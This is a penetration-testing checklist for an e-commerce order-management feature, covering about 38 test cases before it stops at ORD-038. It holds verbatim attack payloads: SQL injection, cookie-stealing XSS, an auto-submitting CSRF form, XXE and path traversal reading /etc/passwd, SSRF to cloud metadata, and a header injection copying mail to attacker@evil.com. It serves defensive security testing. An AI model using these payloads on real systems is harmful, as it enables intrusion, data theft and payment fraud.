# 6. Order Management — Checklist

Feature-area security **test cases** for “6. Order Management”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*188 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## ORD-001 — IDOR on Order Placement for Another User
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Login as User A and initiate order placement. 2. Intercept the request and change user_id or account_id to User B. 3. Submit the order. 4. Check if order is placed under User B account.

**Expected Result:** Application must reject the request and only allow orders under the authenticated user's own account.

**Payload Example:**

```
Change user_id=1001 to user_id=1002 in POST /api/orders body
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-002 — Price Manipulation via Parameter Tampering
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Add items to cart and proceed to checkout. 2. Intercept the order submission request. 3. Modify the price or total_amount parameter to a lower value. 4. Submit the tampered request. 5. Verify if the order is accepted at the manipulated price.

**Expected Result:** Server must recalculate price server-side and reject or correct any tampered price values.

**Payload Example:**

```
Change price=99.99 to price=0.01 in POST /api/orders
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-840; PortSwigger Business logic

---

## ORD-003 — Negative Quantity in Order
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Add item to cart. 2. Intercept the request and change quantity to a negative value. 3. Submit the order. 4. Check if negative quantity causes credit or negative charge.

**Expected Result:** Application must validate that quantity is a positive integer and reject negative or zero values.

**Payload Example:**

```
Change quantity=1 to quantity=-5 in the order payload
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-004 — Zero Amount Order Placement
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Add item to cart. 2. Intercept request and set total_amount=0 or price=0. 3. Submit order. 4. Verify if a free order is processed.

**Expected Result:** Application must not allow zero-amount orders for paid products and must validate server-side.

**Payload Example:**

```
Set total_amount=0.00 or price=0 in POST body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ORD-005 — SQL Injection in Order Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order and intercept the request. 2. Inject SQL payloads into fields like shipping_address or order_notes. 3. Submit and observe the response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries and reject or sanitize malicious SQL input without exposing database errors.

**Payload Example:**

```
shipping_address=' OR 1=1--;  order_notes=1' UNION SELECT username;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-006 — XSS in Order Fields
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order. 2. Insert XSS payloads in fields like shipping_address or special_instructions. 3. Submit the order. 4. View the order in admin panel or order confirmation page. 5. Check if the script executes.

**Expected Result:** Application must sanitize and encode all user input to prevent script execution in any context.

**Payload Example:**

```
<script>alert('XSS')</script> in shipping_address field
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-007 — Race Condition on Limited Stock Items
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Identify an item with limited stock (e.g. 1 remaining). 2. Send multiple simultaneous order requests for the same item using threading. 3. Check if multiple orders are placed exceeding available stock.

**Expected Result:** Application must implement proper locking mechanisms to prevent overselling beyond available inventory.

**Payload Example:**

```
Send 50 concurrent POST /api/orders requests with same item_id using Turbo Intruder
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite;Custom Scripts

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ORD-008 — CSRF on Order Placement
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Craft a malicious HTML page with a form that auto-submits an order placement request. 2. Have an authenticated victim visit the page. 3. Check if the order is placed without the victim's explicit consent.

**Expected Result:** Application must implement and validate CSRF tokens on all state-changing operations including order placement.

**Payload Example:**

```
<form action='https://target.com/api/orders' method='POST'><input name='item_id' value='123'><input name='quantity' value='1'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ORD-009 — Coupon Code Reuse and Tampering
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Apply a single-use coupon code to an order. 2. Complete the order. 3. Attempt to reuse the same coupon on a new order. 4. Also try modifying discount_amount parameter directly.

**Expected Result:** Application must invalidate used coupons server-side and calculate discounts on the server rather than trusting client input.

**Payload Example:**

```
Reuse coupon_code=SAVE50; tamper discount_amount=100.00 to discount_amount=999.99
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-010 — Bypassing Payment Gateway
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order and intercept the payment callback or redirect. 2. Modify the payment_status parameter from pending to success. 3. Forward the request. 4. Check if order is confirmed without actual payment.

**Expected Result:** Application must verify payment status directly with the payment gateway server-side and not rely on client-side payment status.

**Payload Example:**

```
Change payment_status=pending to payment_status=success in callback URL or POST body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-011 — Integer Overflow in Quantity Field
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order. 2. Set quantity to an extremely large integer value. 3. Submit and observe server behavior for overflow or unexpected pricing.

**Expected Result:** Application must validate quantity within acceptable bounds and handle large values gracefully without overflow.

**Payload Example:**

```
quantity=99999999999999999999 or quantity=2147483647
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ORD-012 — Order Placement Without Authentication
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Capture a valid order placement request. 2. Remove the session cookie or authorization token. 3. Replay the request without authentication. 4. Check if the order is placed.

**Expected Result:** Application must require valid authentication for all order placement endpoints.

**Payload Example:**

```
Remove Cookie: session=abc123 or Authorization: Bearer token header
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-013 — Mass Assignment on Order Object
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order with normal parameters. 2. Add additional parameters like is_paid=true or status=delivered or role=admin to the request body. 3. Submit and check if hidden fields are accepted.

**Expected Result:** Application must whitelist allowed parameters and ignore any unexpected or unauthorized fields.

**Payload Example:**

```
Add is_paid=true&shipping_cost=0&status=completed to POST body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ORD-014 — Forced Browsing to Admin Order Endpoint
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. As a regular user try accessing admin order management endpoints. 2. Try URLs like /admin/orders or /api/admin/orders/create. 3. Check if access is granted.

**Expected Result:** Application must enforce role-based access control and deny access to admin endpoints for non-admin users.

**Payload Example:**

```
GET /admin/orders; POST /api/admin/orders/create with regular user token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-015 — HTTP Method Tampering on Order Endpoint
**Test Category:** HTTP Methods (WSTG-CONF-06) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Send order placement request using different HTTP methods (PUT;DELETE;PATCH;OPTIONS;TRACE). 2. Check if any unintended method is accepted and processes the order or reveals information.

**Expected Result:** Application must restrict HTTP methods to only those intended and return 405 Method Not Allowed for others.

**Payload Example:**

```
Send DELETE /api/orders; PUT /api/orders; TRACE /api/orders
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ORD-016 — Rate Limiting on Order Placement
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Send a high volume of order placement requests in rapid succession from the same account. 2. Monitor if rate limiting is enforced. 3. Check for denial-of-service or resource exhaustion.

**Expected Result:** Application must implement rate limiting on order placement to prevent abuse and resource exhaustion.

**Payload Example:**

```
Send 100+ POST /api/orders requests per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ORD-017 — Discount Stacking Abuse
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Apply multiple discount codes or combine discount with sale price. 2. Check if total goes below zero or if combined discounts exceed 100%. 3. Verify server-side discount validation.

**Expected Result:** Application must validate that combined discounts do not exceed allowable limits and total never goes below zero.

**Payload Example:**

```
Apply coupon_code=SAVE50 and coupon_code2=EXTRA30 together; check if total becomes negative
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-018 — XXE in Order Submission (XML-based)
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. If the application accepts XML order payloads intercept the request. 2. Inject an XXE payload in the order XML. 3. Submit and observe if external entities are resolved.

**Expected Result:** Application must disable external entity processing in XML parsers and reject malicious XML input.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><order><item>&xxe;</item></order>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ORD-019 — Server-Side Request Forgery via Webhook URL
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. If order placement allows specifying a callback or webhook URL intercept the request. 2. Set the URL to an internal service (e.g. http://169.254.169.254/latest/meta-data/). 3. Observe the response.

**Expected Result:** Application must validate and whitelist allowed callback URLs and block internal network addresses.

**Payload Example:**

```
callback_url=http://169.254.169.254/latest/meta-data/ or callback_url=http://localhost:6379/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ORD-020 — Currency Manipulation in Order
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place order and intercept request. 2. Change currency parameter from USD to a weaker currency. 3. Check if order is processed at manipulated currency.

**Expected Result:** Application must enforce currency on server-side and not accept client-specified currency values for pricing.

**Payload Example:**

```
Change currency=USD to currency=VND or currency=IRR while keeping same numeric amount
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-021 — IDOR on Order Confirmation Page
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Complete an order and receive confirmation with order_id. 2. Change the order_id in the confirmation URL to another user's order_id. 3. Check if other user's order details are visible.

**Expected Result:** Application must verify that the authenticated user owns the order before displaying confirmation details.

**Payload Example:**

```
Change /order/confirmation/1001 to /order/confirmation/1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-022 — Information Disclosure in Confirmation Response
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Complete an order and inspect the confirmation response. 2. Check for sensitive data like full credit card numbers or internal user IDs or server details. 3. Review both visible page and raw response.

**Expected Result:** Application must mask sensitive data in confirmation responses showing only necessary information like last 4 digits of card.

**Payload Example:**

```
Inspect response body for fields like card_number; internal_id; server_version; debug_info
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-023 — Email Header Injection in Confirmation Email
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. During order placement inject email headers in the email field. 2. Check if the confirmation email is sent to additional recipients or has modified headers.

**Expected Result:** Application must sanitize email addresses and prevent header injection in all email-sending functionality.

**Payload Example:**

```
email=victim@test.com%0ACc:attacker@evil.com or email=victim@test.com\r\nBcc:attacker@evil.com
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## ORD-024 — Confirmation Page Caching Sensitive Data
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Complete an order and view the confirmation page. 2. Check HTTP response headers for caching directives. 3. Use browser back button or access cached page on shared computer.

**Expected Result:** Application must set Cache-Control: no-store and Pragma: no-cache headers on confirmation pages to prevent caching.

**Payload Example:**

```
Check for missing Cache-Control: no-store; Pragma: no-cache; Expires: 0 headers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-025 — XSS via Order Confirmation Details
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Place an order with XSS payload in product name or address fields. 2. View the order confirmation page. 3. Check if the payload executes in the confirmation context.

**Expected Result:** Application must encode all output on confirmation pages to prevent XSS execution.

**Payload Example:**

```
Place order with shipping_name=<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-026 — Replay Attack on Confirmation Endpoint
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Capture the order confirmation request. 2. Replay the exact same request multiple times. 3. Check if duplicate orders are created or confirmation is shown repeatedly.

**Expected Result:** Application must implement idempotency tokens to prevent duplicate order processing from replayed requests.

**Payload Example:**

```
Replay POST /api/orders/confirm with same idempotency key multiple times
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-027 — Brute Force Order Confirmation ID
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Note the format of order confirmation IDs. 2. If they are sequential enumerate nearby IDs. 3. Access confirmation pages for enumerated IDs.

**Expected Result:** Application must use non-sequential unpredictable order IDs and enforce authorization checks on all confirmation endpoints.

**Payload Example:**

```
Enumerate /order/confirmation/10001 through /order/confirmation/10100
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-028 — Sensitive Data Exposure in Confirmation Email
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Place an order and receive confirmation email. 2. Analyze the email for sensitive data like passwords or full payment details or internal references. 3. Check if email is sent over TLS.

**Expected Result:** Confirmation email must contain only necessary information with masked sensitive data and be transmitted securely.

**Payload Example:**

```
Review email content for plain-text passwords; full card numbers; internal system identifiers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Email Client;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-029 — IDOR on Order History Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Login as User A and access order history. 2. Intercept the API call and change user_id to User B. 3. Check if User B's order history is returned.

**Expected Result:** Application must only return order history belonging to the authenticated user regardless of parameter manipulation.

**Payload Example:**

```
Change GET /api/orders?user_id=1001 to user_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-030 — Insecure Direct Object Reference on Individual Order
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Access a specific order from history via order_id. 2. Modify the order_id to access another user's order. 3. Check if unauthorized order details are disclosed.

**Expected Result:** Application must verify ownership of each order before returning its details.

**Payload Example:**

```
Change GET /api/orders/ORD-1001 to GET /api/orders/ORD-1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-031 — Order History Data Leakage via API Response
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Request order history via API. 2. Inspect the JSON response for excessive data like other users' details or internal fields. 3. Check for verbose error messages.

**Expected Result:** API must return only the minimum necessary fields for the authenticated user's orders without excessive data exposure.

**Payload Example:**

```
Look for fields like internal_notes; admin_comments; other_user_email; debug_data in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-032 — SQL Injection in Order History Search/Filter
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Use the order history search or filter functionality. 2. Inject SQL payloads in search parameters like order_id or date_range or status. 3. Observe the response.

**Expected Result:** Application must use parameterized queries and properly validate all filter and search inputs.

**Payload Example:**

```
GET /api/orders?status=' OR '1'='1; GET /api/orders?search=1' UNION SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-033 — Unauthorized Access to Order History Without Auth
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Capture the order history API request. 2. Remove authentication headers or cookies. 3. Send the request and check if order history is returned without authentication.

**Expected Result:** Application must require valid authentication for all order history endpoints.

**Payload Example:**

```
Remove Authorization header from GET /api/orders/history
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-034 — Pagination Bypass to Dump All Orders
**Test Category:** Broken Access Control (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Access order history with pagination. 2. Modify page_size or limit parameter to an extremely large value. 3. Check if all orders including other users' orders are returned.

**Expected Result:** Application must enforce maximum page size limits and ensure pagination only returns the authenticated user's orders.

**Payload Example:**

```
Change GET /api/orders?page=1&limit=10 to limit=999999 or page_size=100000
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-035 — Horizontal Privilege Escalation via Order History
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. As a regular user access order history endpoints meant for admin or support staff. 2. Try endpoints like /api/admin/orders/all or /api/support/orders. 3. Check access.

**Expected Result:** Application must enforce role-based access control preventing regular users from accessing admin order views.

**Payload Example:**

```
GET /api/admin/orders; GET /api/all-orders; GET /api/orders/export with regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-036 — XSS via Stored Order Data in History View
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Place an order with XSS payload in product name or address or notes. 2. Navigate to order history page. 3. Check if the stored payload executes when viewing order history.

**Expected Result:** Application must properly encode all stored data when rendering order history to prevent stored XSS.

**Payload Example:**

```
View order history containing orders with <svg/onload=alert(1)> in shipping_address
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-037 — Export/Download Order History Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Use the order history export or download feature. 2. Intercept the request and modify the file path parameter. 3. Attempt to read arbitrary files from the server.

**Expected Result:** Application must validate file paths and restrict file access to authorized directories only.

**Payload Example:**

```
GET /api/orders/export?file=../../../etc/passwd or file=....//....//etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ORD-038 — IDOR on Order Tracking
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Tracking

